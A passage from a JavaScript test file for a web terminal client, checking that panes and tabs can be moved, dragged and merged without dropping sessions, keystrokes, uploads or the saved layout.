  win.movePaneToTab(b.id, tabOfPane(b));
  await sleep(100);
  ok(JSON.stringify(shapesNow(win)) === JSON.stringify(before), 'moving a pane into its own tab changes nothing; got ' + JSON.stringify(shapesNow(win)));
  cleanup(env);
});

test('move: keys typed but not yet sent when the pane moves arrive once, in order', async () => {
  // /api/input answers slowly: one batch in flight, more keys queued
  // behind it while the pane changes tabs.
  const got = [];
  const env = await mkTabEnv(TAB_PLAN([
    {action: 'input', match: bd => bd && bd.session_id === 'sid-b.host' && bd.data,
     response: bd => { got.push(bd.data); return {ok: true}; }, delay: 150},
  ]), null, S3); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !needMove(win) || !a || !b) { cleanup(env); return; }
  b.term._onDataCb('ec');
  await until(() => !!b.inputInFlight, 500);
  b.term._onDataCb('ho ');
  b.term._onDataCb('one');
  ok(!!b.inputInFlight && b.inputQueue.length > 0, 'setup: a batch in flight and keys queued');
  const spy = sessionSpy(win, [b]);
  win.movePaneToNewTab(b.id);
  b.term._onDataCb(' two\r');
  await until(() => got.join('') === 'echo one two\r', 2000);
  await sleep(200);
  ok(got.join('') === 'echo one two\r', 'everything typed arrived once, in order; got ' + JSON.stringify(got));
  ok(spy.length === 0, 'and the session was not restarted; got ' + JSON.stringify(spy));
  cleanup(env);
});

test('move: a pane moved during its upload keeps uploading, its progress and cancel stay visible', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S3); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !needMove(win) || !a || !b) { cleanup(env); return; }
  const st = hangingXhr(win);
  win.handleUpload(b.id, {files: [{name: 'big.iso', size: 1000}], value: ''});
  await until(() => visibleAll(env, '.upload-progress').length === 1, 500);
  ok(visibleAll(env, '.upload-progress').length === 1, 'setup: progress shown in b\'s bar');
  win.movePaneToNewTab(b.id);
  await until(() => tabEls(win).length === 2, 500);
  await sleep(50);
  ok(!!b.upload && st.xhrs.length >= 1 && !st.xhrs.some(x => x.aborted), 'the upload goes on (not cancelled, not restarted)');
  const vis = visibleAll(env, '.upload-progress');
  ok(vis.length === 1 && b.el.contains(vis[0]), 'its progress is visible, on b, although b has no bar now; got ' + vis.length);
  const cancel = vis[0] && vis[0].querySelector('.upload-progress-cancel');
  ok(!!cancel && !env.lay.hidden(cancel), 'with its cancel button');
  if (cancel) press(win, cancel);
  await until(() => st.xhrs.some(x => x.aborted), 500);
  ok(st.xhrs.some(x => x.aborted), 'and cancel still works');
  cleanup(env);
});

test('move: dragging a pane bar onto the strip makes it a new tab; a click on the bar does nothing', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S3); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !a || !b) { cleanup(env); return; }
  const tA = tabOfPane(a);
  const mark = env.log.length;
  const spy = sessionSpy(win, [a, b]);
  const started = [];
  const realStart = win.startUploadFiles;
  win.startUploadFiles = (id, files) => started.push(id);
  // A click on the label (press and release, no movement) is not a drag.
  const m = pointer(win);
  const [lx, ly] = centre(labelEl(b));
  m.down(labelEl(b), lx, ly); m.up(labelEl(b), lx, ly);
  ok(tabEls(win).length === 1 && shape(win, tA) === '(h a.host b.host)', 'a click on the bar moves nothing; got ' + shapesNow(win));
  // A drag that ends over the panes, not the strip: nothing either.
  m.down(labelEl(b), lx, ly); m.move(labelEl(b), lx + 50, ly + 60); m.move(a.el, lx + 80, ly + 100); m.up(a.el, lx + 80, ly + 100);
  ok(tabEls(win).length === 1 && shape(win, tA) === '(h a.host b.host)', 'a bar dropped back on the panes moves nothing; got ' + shapesNow(win));
  // Onto the strip itself, not on a tab.
  dragPaneBar(win, b, $(win, 'tabs'));
  await until(() => tabEls(win).length === 2, 500);
  ok(tabEls(win).length === 2, 'b\'s bar dropped on the strip: a new tab; got ' + tabEls(win).length);
  const tB = tabOfPane(b);
  ok(tB && tB !== tA && tabId(activeTab(win)) === tB && win.activeId === b.id, 'b is in it, in front and active');
  ok(shape(win, tA) === 'a.host' && shape(win, tB) === 'b.host', 'a alone in the old tab, b in the new; got ' + JSON.stringify(shapesNow(win)));
  ok(spy.length === 0 && sessionCalls(env, mark).length === 0, 'no reconnect, no restart; got ' + JSON.stringify(spy.concat(sessionCalls(env, mark))));
  ok(started.length === 0, 'the drag started no upload');
  ok(!win.document.querySelector('.dragging'), 'no drag state left behind');
  // And again from the other tab, onto "+".
  clickTab(win, tabById(win, tA));
  const c = await tSplit(win, a, 'v', 'c.host');
  if (!c) { ok(false, 'setup: c'); cleanup(env); win.startUploadFiles = realStart; return; }
  dragPaneBar(win, c, $(win, 'tabNew'));
  await until(() => tabEls(win).length === 3, 500);
  ok(tabEls(win).length === 3 && shape(win, tabOfPane(c)) === 'c.host' && tabId(activeTab(win)) === tabOfPane(c),
     'a bar dropped on "+" also makes a new tab; got ' + JSON.stringify(shapesNow(win)));
  ok(hidden($(win, 'ov')), 'and does not open the login form');
  win.startUploadFiles = realStart;
  cleanup(env);
});

test('move: a pane bar dropped on another tab joins it, split right of that tab\'s active pane', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S3); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !a || !b) { cleanup(env); return; }
  const c1 = await tNewTab(win, 'c1.host');
  const c2 = c1 && await tSplit(win, c1, 'v', 'c2.host');
  if (!c2) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a), tC = tabOfPane(c1);
  win.activatePane(c1.id);                      // c1 is C's active pane
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  await settled(win, b);
  const mark = env.log.length;
  const spy = sessionSpy(win, [b]);
  dragPaneBar(win, b, tabById(win, tC));
  await until(() => panesOfTab(win, tC).length === 3, 500);
  ok(shape(win, tC) === '(v (h c1.host b.host) c2.host)', 'b sits right of c1 (C\'s active pane); got ' + shape(win, tC));
  ok(shape(win, tA) === 'a.host', 'a alone in A; got ' + shape(win, tA));
  ok(tabEls(win).length === 2, 'no new tab; got ' + tabEls(win).length);
  ok(tabId(activeTab(win)) === tC && win.activeId === b.id, 'C is shown with b active');
  const sm = tabById(win, tC).querySelector('.tab-split');
  ok(!!sm && markerSays(sm, 3), 'C\'s split marker says "3 panes"; got ' + (sm ? JSON.stringify(sm.title) : 'none'));
  ok(spy.length === 0 && sessionCalls(env, mark).length === 0, 'no reconnect, no restart; got ' + JSON.stringify(spy.concat(sessionCalls(env, mark))));
  await sleep(300);
  ok(sizesSent(env, 'sid-b.host', mark).length === 0, 'b keeps its bar and size: no resize; got ' + JSON.stringify(sizesSent(env, 'sid-b.host', mark)));
  ok(JSON.stringify(savedShapes(win).tabs) === JSON.stringify(shapesNow(win)), 'saved as shown; got ' + JSON.stringify(savedShapes(win)));
  // Dropped on its own tab: nothing.
  const now = JSON.stringify(shapesNow(win));
  dragPaneBar(win, c2, tabById(win, tC));
  await sleep(100);
  ok(JSON.stringify(shapesNow(win)) === now, 'a bar dropped on its own tab changes nothing; got ' + JSON.stringify(shapesNow(win)));
  cleanup(env);
});

test('move: moving the last pane out of a tab removes that tab', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S3); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !needMove(win) || !a) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  const c = b && await tNewTab(win, 'c.host');
  if (!c) { ok(false, 'setup'); cleanup(env); return; }
  const tB = tabOfPane(b), tC = tabOfPane(c);
  clickTab(win, tabById(win, tB));
  await until(() => tabId(activeTab(win)) === tB, 500);
  win.movePaneToTab(b.id, tC);
  await until(() => tabEls(win).length === 2, 500);
  ok(tabEls(win).length === 2 && !tabById(win, tB) && !tabRootById(win, tB), 'b\'s old tab is gone, handle and root; got ' + tabEls(win).length);
  ok(shape(win, tC) === '(h c.host b.host)', 'b joined C right of c; got ' + shape(win, tC));
  ok(tabId(activeTab(win)) === tC, 'C is shown');
  ok(b.sid === 'sid-b.host' && win.panes[b.id] === b, 'b is the same live pane');
  ok(Object.keys(win.panes).length === 3 && hidden($(win, 'ov')), 'nothing else closed, no login form');
  const saved = savedShapes(win);
  ok(!!saved && saved.tabs.length === 2, 'saved without the empty tab; got ' + JSON.stringify(saved));
  cleanup(env);
});

test('merge: dragging a tab onto an edge of a pane puts its whole layout there; the zone shows first', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S3); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a), tB = tabOfPane(b);
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  await settled(win, a);
  const mark = env.log.length;
  const spy = sessionSpy(win, [a, b]);
  const started = [];
  const realStart = win.startUploadFiles;
  win.startUploadFiles = (id) => started.push(id);
  let during = {};
  dragTabOnto(win, tabById(win, tB), a, 'left', {beforeUp: () => {
    during.front = tabId(activeTab(win));
    during.aShown = !env.lay.hidden(a.el);
    during.zone = zoneOf(a);
  }});
  ok(during.front === tA && during.aShown, 'while B is dragged over the panes, A (in front before) stays on screen; front=' +
     during.front + ' a shown=' + during.aShown);
  ok(during.zone === 'left', 'before release the left drop zone is highlighted on a; got ' + JSON.stringify(during.zone));
  await until(() => tabEls(win).length === 1, 500);
  ok(tabEls(win).length === 1 && !tabById(win, tB) && !tabRootById(win, tB), 'the dragged tab is gone; tabs: ' + tabEls(win).length);
  ok(shape(win, tA) === '(h b.host a.host)', 'b landed left of a, side by side; got ' + shape(win, tA));
  ok(tabId(activeTab(win)) === tA, 'A is in front');
  ok(anyZone(win) === 0, 'no drop zone left after the drop');
  ok(spy.length === 0 && sessionCalls(env, mark).length === 0, 'no reconnect, no restart; got ' + JSON.stringify(spy.concat(sessionCalls(env, mark))));
  ok(started.length === 0, 'the drag started no upload');
  const sm = tabById(win, tA).querySelector('.tab-split');
  ok(!!sm && markerSays(sm, 2), 'A\'s split marker says "2 panes"');
  await sleep(300);
  ok(barShown(env, a) && barShown(env, b) && !toolsShown(env), 'two panes: both bars, no top-bar actions');
  const ra = sizesSent(env, 'sid-a.host', mark), rb = sizesSent(env, 'sid-b.host', mark);
  ok(ra.length === 1 && ra[0] === '80x' + (24 - BAR), 'a: one resize, to make room for its bar; got ' + JSON.stringify(ra));
  ok(rb.length === 1 && rb[0] === '80x' + (24 - BAR), 'b: one resize; got ' + JSON.stringify(rb));
  const saved = savedShapes(win);
  ok(!!saved && JSON.stringify(saved.tabs) === JSON.stringify(['(h b.host a.host)']), 'saved at once; got ' + JSON.stringify(saved));
  win.startUploadFiles = realStart;
  cleanup(env);
});

test('merge: the side picks the split; a split tab keeps its own layout inside', async () => {
  for (const [side, want] of [['left', '(h (v b1.host b2.host) a.host)'], ['right', '(h a.host (v b1.host b2.host))'],
                              ['top', '(v (v b1.host b2.host) a.host)'], ['bottom', '(v a.host (v b1.host b2.host))']]) {
    const env = await mkTabEnv(TAB_PLAN(), null, S3); const win = env.win;
    const a = await tConnect(win, 'a.host');
    if (!needTabs(win) || !a) { cleanup(env); return; }
    const b1 = await tNewTab(win, 'b1.host');
    const b2 = b1 && await tSplit(win, b1, 'v', 'b2.host');
    if (!b2) { ok(false, 'setup'); cleanup(env); return; }
    const tA = tabOfPane(a), tB = tabOfPane(b1);
    clickTab(win, tabById(win, tA));
    await until(() => tabId(activeTab(win)) === tA, 500);
    let zone = null;
    dragTabOnto(win, tabById(win, tB), a, side, {beforeUp: () => { zone = zoneOf(a); }});
    await until(() => tabEls(win).length === 1, 500);
    ok(zone === side, side + ': the ' + side + ' zone is highlighted before release; got ' + JSON.stringify(zone));
    ok(shape(win, tA) === want, side + ': ' + want + '; got ' + shape(win, tA));
    ok([a, b1, b2].every(p => win.panes[p.id] === p && p.sid === 'sid-' + p.host), side + ': all three panes live, same sessions');
    cleanup(env);
  }
});

test('merge: by the hook, into a nested split; the saved layout reloads the same', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S3); const win = env.win;
  const [a1, a2] = await splitTabEnv(win, ['a1.host', 'a2.host']);
  if (!needTabs(win) || !needMove(win) || !a1 || !a2) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  const c = b && await tNewTab(win, 'c.host');
  if (!c) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a1), tB = tabOfPane(b);
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  const spy = sessionSpy(win, [a1, a2, b]);
  win.mergeTabInto(tB, a2.id, 'bottom');
  ok(shape(win, tA) === '(h a1.host (v a2.host b.host))', 'b under a2, inside the existing split; got ' + shape(win, tA));
  ok(tabEls(win).length === 2 && !tabById(win, tB), 'B is gone, C stays');
  ok(spy.length === 0, 'nothing restarted; got ' + JSON.stringify(spy));
  const want = shapesNow(win);
  ok(!!savedShapes(win) && JSON.stringify(savedShapes(win).tabs) === JSON.stringify(want), 'saved at once; got ' + JSON.stringify(savedShapes(win)));
  const snap = snapshotStorage(win);
  cleanup(env);
  const env2 = await mkTabEnv(TAB_PLAN(), snap, S3); const w2 = env2.win;
  await until(() => paneList(w2).filter(p => p.sid).length === 4, 2000);
  ok(JSON.stringify(shapesNow(w2)) === JSON.stringify(want), 'reload: the merged layout is back; got ' + JSON.stringify(shapesNow(w2)));
  ok(activeTab(w2) && shape(w2, tabId(activeTab(w2))) === want[0], 'with the merged tab in front');
  cleanup(env2);
});

test('merge: a tab dropped on its own panes, on a hidden tab\'s pane, or released outside does nothing', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S3); const win = env.win;
  const [a1, a2] = await splitTabEnv(win, ['a1.host', 'a2.host']);
  if (!needTabs(win) || !needMove(win) || !a1 || !a2) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a1), tB = tabOfPane(b);
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  await sleep(100);
  const before = JSON.stringify(shapesNow(win)), saved0 = JSON.stringify(savedShapes(win));
  const mark = env.log.length;
  // The tab on screen dragged onto one of its own panes.
  let zone = null;
  dragTabOnto(win, tabById(win, tA), a2, 'right', {beforeUp: () => { zone = zoneOf(a2); }});
  await sleep(100);
  ok(JSON.stringify(shapesNow(win)) === before, 'A onto its own pane: nothing changes; got ' + JSON.stringify(shapesNow(win)));
  ok(!zone, 'and no drop zone offered on its own pane; got ' + JSON.stringify(zone));
  ok(anyZone(win) === 0, 'no zone left');
  // The hook, too.
  win.mergeTabInto(tA, a1.id, 'left');
  ok(JSON.stringify(shapesNow(win)) === before, 'mergeTabInto(A, a pane of A): nothing');
  // B dragged over a1, button released outside the window: the next
  // move has no button down. Nothing may happen, no zone stays.
  const m = dragTabOnto(win, tabById(win, tB), a1, 'left', {noUp: true});
  m.moveNoButton(a1.el, 30, 30);
  m.up(a1.el, 30, 30);                 // a stray mouseup later
  await sleep(100);
  ok(JSON.stringify(shapesNow(win)) === before, 'a drag whose button went up outside merges nothing; got ' + JSON.stringify(shapesNow(win)));
  ok(anyZone(win) === 0, 'and leaves no drop zone');
  ok(!win.document.querySelector('.dragging'), 'and no drag state');
  ok(env.log.slice(mark).filter(e => e.action === 'connect' || e.action === 'disconnect').length === 0, 'nothing sent');
  ok(JSON.stringify(savedShapes(win)) === saved0, 'saved layout unchanged');
  cleanup(env);
});

test('move: OS file drags still upload, and are never taken for a pane or tab drag', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S3); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !needMove(win) || !a || !b) { cleanup(env); return; }
  const c = await tNewTab(win, 'c.host');
  if (!c) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a), tC = tabOfPane(c);
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  const started = [];
  const realStart = win.startUploadFiles;
  win.startUploadFiles = (id, files) => started.push(id);
  const item = {kind: 'file', getAsFile: () => ({name: 'x.txt', size: 3}), webkitGetAsEntry: () => ({isDirectory: false})};
  const fileDrag = (target, type, x, y) => {
    const ev = new win.MouseEvent(type, {bubbles: true, cancelable: true, clientX: x || 0, clientY: y || 0, buttons: 1});
    Object.defineProperty(ev, 'dataTransfer', {value: {types: ['Files'], items: [item], files: [item.getAsFile()], dropEffect: ''}});
    win.document.elementFromPoint = () => target;
    target.dispatchEvent(ev);
    return ev;
  };
  const before = JSON.stringify(shapesNow(win));
  // A file dragged over the strip and onto a tab: no tab, no move.
  fileDrag($(win, 'tabs'), 'dragenter'); fileDrag($(win, 'tabs'), 'dragover');
  fileDrag(tabById(win, tC), 'dragover'); fileDrag(tabById(win, tC), 'drop');
  ok(JSON.stringify(shapesNow(win)) === before && tabEls(win).length === 2, 'a file dropped on a tab moves and creates nothing');
  // A file over the edge of a pane: the upload highlight, not a merge zone.
  const [x, y] = edgePoint(a.el, 'left');
  fileDrag(a.el, 'dragenter', x, y); fileDrag(a.el, 'dragover', x, y);
  ok(a.el.classList.contains('drop-target') && !zoneOf(a), 'a file over a pane edge shows the upload highlight, no merge zone');
  const ev = fileDrag(a.el, 'drop', x, y);
  ok(ev.defaultPrevented && started.length === 1 && started[0] === a.id, 'and uploads into a; got ' + JSON.stringify(started));
  ok(JSON.stringify(shapesNow(win)) === before, 'layout untouched by the file drop');
  // Panes that moved still take files.
  win.movePaneToNewTab(b.id);
  await until(() => tabEls(win).length === 3, 500);
  fileDrag(b.el, 'dragenter'); fileDrag(b.el, 'drop');
  ok(started.length === 2 && started[1] === b.id, 'a file dropped on b after its move uploads into b; got ' + JSON.stringify(started));
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  win.mergeTabInto(tC, a.id, 'right');
  await until(() => tabEls(win).length === 2, 500);
  fileDrag(c.el, 'dragenter'); fileDrag(c.el, 'drop');
  ok(started.length === 3 && started[2] === c.id, 'a file dropped on c after its tab merged uploads into c; got ' + JSON.stringify(started));
  win.startUploadFiles = realStart;
  cleanup(env);
});

test('move (break): back and forth ten times; same session, one tab per move, saved each time', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S3); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !needMove(win) || !a || !b) { cleanup(env); return; }
  const tA = tabOfPane(a);
  await settled(win, a); await settled(win, b);
  const mark = env.log.length;
  const spy = sessionSpy(win, [a, b]);
  let bad = [];
  for (let i = 0; i < 10; i++) {
    win.movePaneToNewTab(b.id);
    if (tabEls(win).length !== 2 || shape(win, tabOfPane(b)) !== 'b.host') bad.push(i + ' out: ' + JSON.stringify(shapesNow(win)));
    const s1 = savedShapes(win);
    if (!s1 || s1.tabs.length !== 2) bad.push(i + ' out saved: ' + JSON.stringify(s1));
    win.movePaneToTab(b.id, tA);
    if (tabEls(win).length !== 1 || shape(win, tA) !== '(h a.host b.host)') bad.push(i + ' back: ' + JSON.stringify(shapesNow(win)));
    const s2 = savedShapes(win);
    if (!s2 || s2.tabs.length !== 1) bad.push(i + ' back saved: ' + JSON.stringify(s2));
  }
  ok(bad.length === 0, 'every move gives the expected tabs and saves them; ' + JSON.stringify(bad.slice(0, 3)));
  ok(tabRoots(win).length === 1, 'no stray tab roots; got ' + tabRoots(win).length);
  ok(spy.length === 0 && sessionCalls(env, mark).length === 0, 'never a reconnect or restart; got ' + JSON.stringify(spy.concat(sessionCalls(env, mark)).slice(0, 5)));
  await sleep(400);
  const rs = env.log.slice(mark).filter(e => e.action === 'resize');
  ok(rs.length <= 2, 'the PTYs are resized at most once each for the whole burst (bars back where they were); got ' +
     JSON.stringify(rs.map(e => e.body.session_id + ' ' + e.body.cols + 'x' + e.body.rows)));
  ok(rs.filter(degenerate).length === 0, 'no degenerate resize');
  ok(barShown(env, a) && barShown(env, b) && a.term.rows === 24 - BAR && b.term.rows === 24 - BAR, 'ends as it started: both bars, 22 rows');
  cleanup(env);
});


// Structure checks after any sequence of moves: every pane in exactly one
// tab root, no empty roots or wrappers, every split has two parts, the
// handles and roots match the tab list, and the saved manifest says the
// same as the DOM.
function layoutProblems(win) {
  const bad = [];
  const roots = tabRoots(win), handles = tabEls(win);
  if (roots.length !== handles.length) bad.push(roots.length + ' roots for ' + handles.length + ' tabs');
  handles.forEach(h => { if (!tabRootById(win, tabId(h))) bad.push('tab ' + tabId(h) + ' has no root'); });
  roots.forEach(r => {
    const kids = Array.from(r.children).filter(c => /\b(pane|split-h|split-v)\b/.test(c.className));
    if (kids.length !== 1) bad.push('root ' + r.getAttribute('data-tab') + ' has ' + kids.length + ' layout nodes');
  });
  win.document.querySelectorAll('#panes .split-h, #panes .split-v').forEach(w => {
    const parts = Array.from(w.children).filter(c => /\b(pane|split-h|split-v)\b/.test(c.className));
    const hs = Array.from(w.children).filter(c => c.classList.contains('split-handle'));
    if (parts.length !== 2 || hs.length !== 1) bad.push('a split with ' + parts.length + ' parts and ' + hs.length + ' handles');
  });
  paneList(win).forEach(p => {
    if (!win.document.contains(p.el)) bad.push(p.host + ' not in the document');
    else if (!p.el.closest('.tab-root')) bad.push(p.host + ' outside any tab');
  });
  if (win.document.querySelectorAll('#panes .pane').length !== paneList(win).length) bad.push('stray .pane elements');
  const sv = savedShapes(win);
  if (!sv || JSON.stringify(sv.tabs) !== JSON.stringify(shapesNow(win))) bad.push('saved ' + JSON.stringify(sv && sv.tabs) + ' vs shown ' + JSON.stringify(shapesNow(win)));
  else if (sv.tabs[sv.active] !== shape(win, tabId(activeTab(win)))) bad.push('saved active tab is not the one in front');
  handles.forEach(h => {
    const n = panesOfTab(win, tabId(h)).length;
    const root = tabRootById(win, tabId(h));
    if (root && root.classList.contains('solo') !== (n === 1)) bad.push('tab ' + tabId(h) + ' solo=' + root.classList.contains('solo') + ' with ' + n + ' panes');
  });
  return bad;
}

test('move (break): twenty random moves and merges keep a sound layout, saved as shown, sessions untouched', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S3); const win = env.win;
  const [a1, a2] = await splitTabEnv(win, ['a1.host', 'a2.host']);
  if (!needTabs(win) || !needMove(win) || !a1 || !a2) { cleanup(env); return; }
  const b1 = await tNewTab(win, 'b1.host');
  const b2 = b1 && await tSplit(win, b1, 'v', 'b2.host');
  const c = b2 && await tNewTab(win, 'c.host');
  if (!c) { ok(false, 'setup'); cleanup(env); return; }
  const all = [a1, a2, b1, b2, c];
  const mark = env.log.length;
  const spy = sessionSpy(win, all);
  // A fixed pseudo-random sequence (same every run).
  let seed = 7;
  const rnd = n => { seed = (seed * 1103515245 + 12345) % 2147483648; return seed % n; };
  const sides = ['left', 'right', 'top', 'bottom'];
  const log = [], bad = [];
  for (let i = 0; i < 20; i++) {
    const ts = tabEls(win).map(tabId);
    const p = all[rnd(all.length)];
    const op = rnd(3);
    if (op === 0) { win.movePaneToNewTab(p.id); log.push('new ' + p.host); }
    else if (op === 1) { const t = ts[rnd(ts.length)]; win.movePaneToTab(p.id, t); log.push(p.host + '->' + t); }
    else {
      const t = ts[rnd(ts.length)], side = sides[rnd(4)];
      win.mergeTabInto(t, p.id, side); log.push('merge ' + t + ' ' + side + ' of ' + p.host);
    }
    const pr = layoutProblems(win);
    if (pr.length) bad.push(i + ' ' + log[log.length - 1] + ': ' + pr.join('; '));
  }
  ok(bad.length === 0, 'after every step the layout is sound and saved as shown; ' + JSON.stringify(bad.slice(0, 3)));
  ok(paneList(win).length === 5 && all.every(p => win.panes[p.id] === p && p.sid === 'sid-' + p.host),
     'all five panes alive with their sessions');
  ok(spy.length === 0 && sessionCalls(env, mark).length === 0, 'no reconnect, no restart; got ' + JSON.stringify(spy.concat(sessionCalls(env, mark)).slice(0, 5)));
  await sleep(400);
  ok(env.log.slice(mark).filter(e => e.action === 'resize' && degenerate(e)).length === 0, 'no degenerate resize');
  // Every pane still in a tab that can be shown, fitted when it is (each
  // tab is left on screen until its panes have settled).
  for (const h of tabEls(win)) {
    clickTab(win, h);
    await until(() => tabId(activeTab(win)) === tabId(h), 500);
    for (const p of panesOfTab(win, tabId(h))) await settled(win, p);
  }
  const wrong = all.filter(p => {
    const want = panesOfTab(win, tabOfPane(p)).length > 1 ? 24 - BAR : 24;
    return p.lastSentRows !== want || p.term.rows !== want;
  }).map(p => p.host + ' ' + p.term.rows + '/' + p.lastSentRows);
  ok(wrong.length === 0, 'each pane, once shown, has its rows and the server has them too; wrong: ' + JSON.stringify(wrong));
  ok(env.log.slice(mark).filter(e => e.action === 'resize' && degenerate(e)).length === 0, 'still no degenerate resize');
  // And a reload brings back what was shown.
  const want = shapesNow(win);
  const snap = snapshotStorage(win);
  cleanup(env);
  const env2 = await mkTabEnv(TAB_PLAN(), snap, S3); const w2 = env2.win;
  await until(() => paneList(w2).filter(p => p.sid).length === 5, 2000);
  ok(JSON.stringify(shapesNow(w2)) === JSON.stringify(want), 'reload: the same layout; got ' + JSON.stringify(shapesNow(w2)) + ' want ' + JSON.stringify(want));
  cleanup(env2);
});

test('move (break): a pane moved while it is still connecting after a reload ends up connected, in its new tab', async () => {
  const env1 = await mkTabEnv(TAB_PLAN(), null, S3); const w1 = env1.win;
  const [a, b] = await splitTabEnv(w1, ['a.host', 'b.host']);
  if (!needTabs(w1) || !a || !b) { cleanup(env1); return; }
  await sleep(50);
  const snap = snapshotStorage(w1);
  cleanup(env1);
  // b's connect answers late.
  const env = await mkTabEnv(TAB_PLAN([
    {action: 'connect', match: bd => bd && bd.host === 'b.host', response: {session_id: 'sid-b.host', alive: true}, delay: 400},
  ]), snap, S3); const win = env.win;
  if (!needMove(win)) { cleanup(env); return; }
  await until(() => paneList(win).length === 2 && paneList(win).some(p => p.host === 'a.host' && p.sid), 1500);
  const pb = paneList(win).find(p => p.host === 'b.host');
  ok(!!pb && !pb.sid, 'setup: b is still connecting');
  if (!pb) { cleanup(env); return; }
  win.movePaneToNewTab(pb.id);
  ok(tabEls(win).length === 2 && shape(win, tabOfPane(pb)) === 'b.host', 'b moved to its own tab while connecting');
  await until(() => pb.sid === 'sid-b.host', 2000);
  await sleep(300);
  ok(pb.sid === 'sid-b.host' && win.panes[pb.id] === pb, 'its connect completed into the same pane');
  ok(shape(win, tabOfPane(pb)) === 'b.host' && tabEls(win).length === 2, 'and it stayed in its new tab; got ' + JSON.stringify(shapesNow(win)));
  ok(env.log.filter(e => e.action === 'connect' && e.body.host === 'b.host').length === 1, 'one connect for b, not two');
  ok(dotState(tabElOfPane(win, pb)) === 's-on', 'its tab says connected; got ' + dotState(tabElOfPane(win, pb)));
  ok(tabLabel(tabElOfPane(win, pb)) === paneLabel(pb) && paneLabel(pb) !== '', 'its tab carries its label: ' + JSON.stringify(tabLabel(tabElOfPane(win, pb))));
  ok(layoutProblems(win).length === 0, 'layout sound: ' + JSON.stringify(layoutProblems(win)));
  ok(!barShown(env, pb) && pb.term.rows === 24 && serverSize(env, 'sid-b.host') === '80x24',
     'alone in its tab: no bar, 24 rows, and the server has 80x24; got ' + pb.term.rows + ' rows, server ' + serverSize(env, 'sid-b.host'));
  cleanup(env);
});

test('move (break): a persistent pane moved while it re-attaches keeps its keys and its tab', async () => {
  const sent = [];
  let n = 0;
  const env = await mkTabEnv(TAB_PLAN([
    {action: 'connect', match: bd => bd && bd.host === 'b.host' && bd.slot_id,
     response: () => ({session_id: 'sid-b.host-' + (++n), alive: true}), delay: () => 1},
    {action: 'input', match: bd => bd && /^sid-b\.host/.test(bd.session_id) && bd.data,
     response: bd => { sent.push(bd.data); return {ok: true}; }},
  ]), null, S3); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tSplit(win, a, 'h', 'b.host', {persistent: true});
  if (!needTabs(win) || !needMove(win) || !b) { cleanup(env); return; }
  ok(b.persistent && !!b.slotId, 'setup: b is a persistent pane');
  // Its session is gone on the server: it re-attaches.
  const sid0 = b.sid;
  // slow the re-attach
  env.win.fetch = (inner => function (url, init) {
    if (/action=connect/.test(String(url))) return sleep(300).then(() => inner(url, init));
    return inner(url, init);
  })(env.win.fetch);
  env.win.fetch.__state = env.state;
  win.handleOutputPayload(b, {error: 'session not found'}, sid0);
  ok(!b.sid && b.connecting, 'b is re-attaching');
  b.term._onDataCb('ls -la\r');
  win.movePaneToNewTab(b.id);
  ok(shape(win, tabOfPane(b)) === 'b.host', 'b moved to its own tab during the re-attach');
  await until(() => !!b.sid && b.sid !== sid0, 2000);
  win.handleOutputPayload(b, {data: Buffer.from('\x1b[?1049htmux', 'latin1').toString('base64'), alive: true}, b.sid);
  await until(() => sent.join('') === 'ls -la\r', 1500);
  ok(!!b.sid && b.sid !== sid0, 're-attached');
  ok(sent.join('') === 'ls -la\r', 'the key typed during the re-attach arrived once; got ' + JSON.stringify(sent));
  ok(shape(win, tabOfPane(b)) === 'b.host' && tabEls(win).length === 2, 'and b is still in its own tab; got ' + JSON.stringify(shapesNow(win)));
  ok(layoutProblems(win).length === 0, 'layout sound: ' + JSON.stringify(layoutProblems(win)));
  cleanup(env);
});

test('move (break): the dragged pane or tab closing mid-drag leaves nothing behind', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S3); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !needMove(win) || !a || !b) { cleanup(env); return; }
  const c = await tNewTab(win, 'c.host');
  if (!c) { ok(false, 'setup'); cleanup(env); return; }
  clickTab(win, tabElOfPane(win, a));
